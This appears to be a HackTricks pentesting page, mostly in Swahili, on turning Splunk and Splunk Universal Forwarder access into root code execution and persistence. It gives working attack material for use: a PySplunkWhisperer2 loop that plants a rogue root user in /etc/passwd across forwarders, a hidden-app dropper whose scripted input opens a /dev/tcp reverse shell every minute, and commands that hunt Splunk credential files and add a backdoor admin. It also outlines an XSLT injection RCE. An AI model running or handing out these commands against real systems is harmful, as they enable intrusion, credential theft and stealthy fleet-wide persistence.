# Splunk LPE and Persistence

Ikiwa unafanya **enumerating** mashine **internally** au **externally** na ukapata **Splunk running** (kwa kawaida **8000** kwa web UI na **8089** kwa management API), credentials valid mara nyingi zinaweza kubadilishwa kuwa **code execution** kupitia usakinishaji wa app, scripted inputs, au management actions.<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> Ikiwa Splunk inaendesha kama **root**, mara nyingi hilo huwa **privilege escalation** ya moja kwa moja.<sup>[[1]](#references)</sup>

Ikiwa unahitaji tu generic remote attack surface, enumeration, au app-upload RCE path, angalia:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Ikiwa tayari wewe ni **root** na Splunk service haisikilizi localhost pekee, unaweza pia kuiba **Splunk password hashes**, kurejesha **encrypted secrets**, au kusukuma **malicious app** ili kudumisha persistence locally au across multiple forwarders.<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>

## Faili za Ndani za Kuvutia

Unapofika kwenye host inayoendesha Splunk au Splunk Universal Forwarder, hizi kwa kawaida ndizo paths zinazovutia zaidi:<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Artifacts muhimu:

- **`$SPLUNK_HOME/etc/passwd`**: watumiaji wa ndani wa Splunk na password hashes.<sup>[[7]](#references)</sup>
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: key inayotumiwa na Splunk kusimba secrets zilizohifadhiwa katika faili kadhaa za `.conf`.<sup>[[8]](#references)</sup>
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: faili ya awali ya bootstrap ya admin; ni muhimu katika gold images na makosa ya provisioning. Hupuuzwa ikiwa `etc/passwd` tayari ipo.<sup>[[9]](#references)</sup>
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: mahali ambapo scripted inputs huwezeshwa kwa kawaida.<sup>[[10]](#references)</sup>
- **`$SPLUNK_HOME/etc/deployment-apps/`** au **`$SPLUNK_HOME/etc/apps/`**: maeneo mazuri ya kuficha persistent app au kukagua kile ambacho tayari kinasambazwa.<sup>[[11]](#references)</sup>

## Muhtasari wa Splunk Universal Forwarder Agent Exploit

Kwa maelezo zaidi angalia [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Huu ni muhtasari tu.<sup>[[1]](#references)</sup>

**Muhtasari wa exploit:**
Exploit inayolenga Splunk Universal Forwarder (UF) huwawezesha attackers wenye **agent password** kutekeleza arbitrary code kwenye mifumo inayoendesha agent, na hivyo uwezekano wa kuathiri sehemu kubwa ya environment.<sup>[[1]](#references)</sup>

**Kwa nini inafanya kazi:**

- Huduma ya usimamizi ya UF kwa kawaida huonekana kwenye **TCP 8089**.<sup>[[6]](#references)</sup>
- Attackers wanaweza ku-authenticate kwenye API na kuagiza forwarder isakinishe **malicious app bundle**.<sup>[[1]](#references)[[5]](#references)</sup>
- Primitive hiyo hiyo inaweza kutumiwa locally kwa **LPE** au remotely kwa **RCE**.<sup>[[5]](#references)</sup>
- Public tooling kama **SplunkWhisperer2** huunda app bundle automatically na inaweza ku-adapt payloads kwa Linux targets.<sup>[[5]](#references)</sup>

**Njia za kawaida za kupata tena password:**

- Credentials za cleartext katika documentation, scripts, shares, au deployment automation.<sup>[[1]](#references)</sup>
- Password hashes ndani ya `$SPLUNK_HOME/etc/passwd`, zikifuatiwa na offline cracking.<sup>[[1]](#references)[[7]](#references)</sup>
- Golden images au provisioning leftovers kama `user-seed.conf`.<sup>[[1]](#references)[[9]](#references)</sup>

**Athari:**

- Utekelezaji wa code wa kiwango cha SYSTEM/root kwenye kila host iliyoathiriwa.<sup>[[1]](#references)</sup>
- Usambazaji wa persistent apps, backdoors, au ransomware.<sup>[[1]](#references)</sup>
- Kuzima au kuchezea telemetry kabla data haijaforwardiwa.<sup>[[1]](#references)</sup>

**Mfano wa command ya exploitation:**

Ripoti ya awali inaonyesha loop ifuatayo ya kutuma payload kwa forwarders wengi.<sup>[[1]](#references)</sup>
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits za umma zinazoweza kutumika:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence kupitia Scripted Inputs au Malicious Apps

Ikiwa una **filesystem write access** kama `root`/`splunk`, au authenticated access ya kusakinisha apps, persistence mechanism inayotegemeka sana ni kuweka **custom app** yenye **scripted input**.<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> Nyaraka rasmi za Splunk zinatarajia scripted inputs ziwekwe ndani ya directory ya app na ziwezeshwe kutoka `inputs.conf`.<sup>[[10]](#references)</sup>

Muundo wa kawaida:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
`inputs.conf` Ndogo:<sup>[[10]](#references)</sup>
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Dropper ya haraka ya Linux (ikitumia mpangilio huo wa app ulioandikwa):<sup>[[10]](#references)</sup>
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Maelezo:

- Mbinu hiyo hiyo inafanya kazi kwenye **Universal Forwarder** kwa kutumia `/opt/splunkforwarder/etc/apps/`.<sup>[[2]](#references)[[10]](#references)</sup>
- Washambuliaji mara nyingi huchanganyika kwa kurekebisha add-on halali badala ya kuunda app inayoonekana wazi kuwa ni hasidi.<sup>[[2]](#references)</sup>
- Kwenye **deployment server**, kuweka app hasidi ndani ya `deployment-apps/` hugeuka kuwa **fleet-wide persistence** kwa sababu forwarders huuliza mara kwa mara, hupakua apps zilizosasishwa, na mara nyingi hujianzisha upya ili kuzitumia.<sup>[[11]](#references)[[12]](#references)</sup>

## Wizi wa Credentials na Utekaji wa Admin

Ikiwa unaweza kusoma local files za Splunk, kwa kawaida kuna malengo mawili mazuri: kurejesha **Splunk admin access** na kurejesha **encrypted service credentials**.<sup>[[8]](#references)</sup>

### Password hashes na local users

Splunk huhifadhi data ya local authentication kwenye `etc/passwd`. Kulingana na deployment, kuvunja faili hiyo kunaweza kurejesha credentials zinazofanya kazi kwa web UI na management API.<sup>[[1]](#references)[[7]](#references)</sup>

Ikiwa tayari una credentials halali za **admin** na Splunk inatumia backend yake ya **native** authentication, CLI yenyewe inaweza kutumika kwa persistence.<sup>[[13]](#references)</sup>
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` na values zilizosimbwa

Splunk hutumia `etc/auth/splunk.secret` kulinda values nyeti zilizohifadhiwa katika configuration files nyingi. Ikiwa unaweza kuiba **secret** na **`.conf` files** husika, mara nyingi unaweza kurejesha au kutumia tena:<sup>[[8]](#references)</sup>

- shared secrets za forwarder/indexer kama vile `pass4SymmKey`
- passwords za TLS private-key kama vile `sslPassword`
- credentials za LDAP bind kama vile `bindDNPassword`

Hii inaweza kusaidia **lateral movement** hata wakati Splunk admin password yenyewe haiwezi ku-crackiwa.<sup>[[8]](#references)</sup>

### Matumizi mabaya ya `user-seed.conf`

`user-seed.conf` hutumiwa tu wakati wa first start au wakati `etc/passwd` haipo. Hilo huifanya isiwe na manufaa sana kwenye live box, lakini iwe ya kuvutia sana katika:<sup>[[9]](#references)</sup>

- installation templates zilizoathiriwa
- container images
- unattended provisioning workflows
- appliances ambapo Splunk huanzishwa upya automatically

Katika hali hizo, kuweka `HASHED_PASSWORD` iliyotengenezwa kwa `splunk hash-passwd` hukupa njia tulivu ya kurejesha admin access baada ya redeployment.<sup>[[9]](#references)</sup>

## Abusing Splunk Queries

Kwa maelezo zaidi angalia [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

Technique muhimu ya hivi karibuni ni kutumia vibaya **user-supplied XSLT** katika Splunk Enterprise versions zilizo katika hatari, ili kubadilisha authenticated account yenye privileges ndogo kuwa **OS command execution** kama user wa `splunk`.<sup>[[3]](#references)[[4]](#references)</sup>

Mtiririko wa jumla:<sup>[[3]](#references)[[4]](#references)</sup>

1. Authenticate kwenye Splunk.
2. Upload **XSL** file hasidi kupitia preview/upload functionality.
3. Fanya Splunk irender search results kwa kutumia stylesheet hiyo iliyopakiwa kutoka kwenye **dispatch** directory.
4. Tumia XSLT payload kuandika file au ku-trigger execution kupitia Splunk's search pipeline (kwa mfano kwa kufikia internal functionality kama `runshellscript`).

Jambo muhimu kwa upande wa offensive ni kwamba njia hii ni **post-auth RCE bila kuhitaji app upload**. Kwenye Linux kwa kawaida inakuweka kwenye **`splunk`** account, ambayo bado ni muhimu kwa sababu user huyo mara nyingi anamiliki application tree, anaweza kusoma secrets, na anaweza kuweka persistent apps zinazodumu hata baada ya shell kupotea.<sup>[[3]](#references)[[4]](#references)</sup>

Representative path iliyotumika wakati wa exploitation ni:<sup>[[4]](#references)</sup>
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Ikiwa Splunk inaendeshwa ikiwa na privileges nyingi kupita kiasi, au ikiwa user `splunk` ana access ya scripts hatari, service units zinazoweza kuandikwa, au sheria mbaya za `sudo`, hii huwa chain safi ya **LPE**.

## References

- [1] [Kutumia vibaya Splunk Forwarders kwa RCE na Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Jihadhari na TraitorWare: Kutumia Splunk kwa Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Ushauri wa Usalama wa Splunk SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [Uchambuzi wa CVE-2023-46214: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [6] [Kubadilisha thamani chaguo-msingi](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
- [8] [Kusambaza passwords salama kwenye servers nyingi](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
- [10] [Kuweka scripted input](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
- [11] [Kuunda deployment apps](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
- [12] [Jinsi deployment updates hutokea](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
- [13] [Kusanidi users kwa CLI](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
{{#include ../../banners/hacktricks-training.md}}
